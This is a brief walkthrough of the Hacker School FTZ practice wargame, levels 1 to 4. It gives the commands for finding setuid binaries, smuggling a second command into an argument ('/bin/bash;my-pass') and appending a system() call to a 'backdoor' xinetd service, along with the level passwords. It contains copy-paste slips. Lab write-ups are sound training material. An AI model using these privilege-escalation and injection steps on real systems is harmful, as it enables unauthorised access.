# TITLE : hacker School FTZ 
```
IP : 192.168.0.6

Q.unkown terminal "xterm-256color"
: export TERM=xterm


```

# 2020's Kali linux ssh access command
```
ssh -c aes128-cbc level@IP

```

# WalkThrough

***level1***

```
1. cat hint
2. find / -perm -4000 -user -level2 2>/dev/null
3. /bin/ExecuteMe
4. bash
5. get the level2 password
6. level2 password id "hacker or cracker"
```

***leve2***
```
1. cat hint
2. find / -perm -4000 -user -level3 2>/dev/null
3. /usr/bin/editor
4. /usr/bin/editor ~/public_html/inedx.html
5. get the level2 password command is : my-pass
6. level3 password id "can you fly?"
```

***leve3***
```
1. cat hint
2. find / -perm -4000 -user -level4 2>/dev/null
3. /bin/autodig
4. /usr/bin/autodig "/bin/bash;my-pass"
5. get the level2 password command is : my-pass
6. level4 password id "suck my brain"
```

***leve4***
```
1. cat hint
2. cd /etc/xinet.d/ , cat backdoor , cd /home/level4/tmp/
3. system("my-pass") by c >> backdoor
4. finger @localhost
5. level5 password id "what is your name?"
```

